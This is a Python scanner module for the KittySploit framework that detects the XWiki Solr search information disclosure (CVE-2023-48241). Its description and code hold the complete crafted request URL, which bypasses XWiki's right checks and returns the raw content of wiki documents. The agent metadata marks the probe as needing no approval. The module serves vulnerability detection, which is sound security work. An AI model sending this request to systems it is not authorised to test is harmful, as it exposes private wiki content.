#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Solr-based search suggestion provider that also duplicates as generic JavaScript API for search results in."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki < 4.10.15 - Information Disclosure Detection',
        'description': "The Solr-based search suggestion provider that also duplicates as generic JavaScript API for search results in XWiki exposes the content of all documents of all wikis to anybody who has access to it, by default it is public. This exposes all information stored in the wiki (but not some protected information like password hashes). While there is a right check normally, the right check can be circumvented by explicitly requesting fields from Solr that don't include the data for the right check. This can be reproduced by opening <xwiki-server>/xwiki/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+ where <xwiki-server> is the URL of the XWiki installation. If this displays any results, the wiki is vulnerable.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xwiki', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://jira.xwiki.org/browse/XWIKI-21138', 'https://nvd.nist.gov/vuln/detail/CVE-2023-48241'],
        'cve': 'CVE-2023-48241',
    }

    def run(self):
        for path in ('/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+', '/xwiki/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('{"reference":', 'title_":', 'services.localization.render',)
            header_any = ('application/json',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="XWiki < 4.10.15 - Information Disclosure detected",
                    path=path,
                )
                return True
        return False

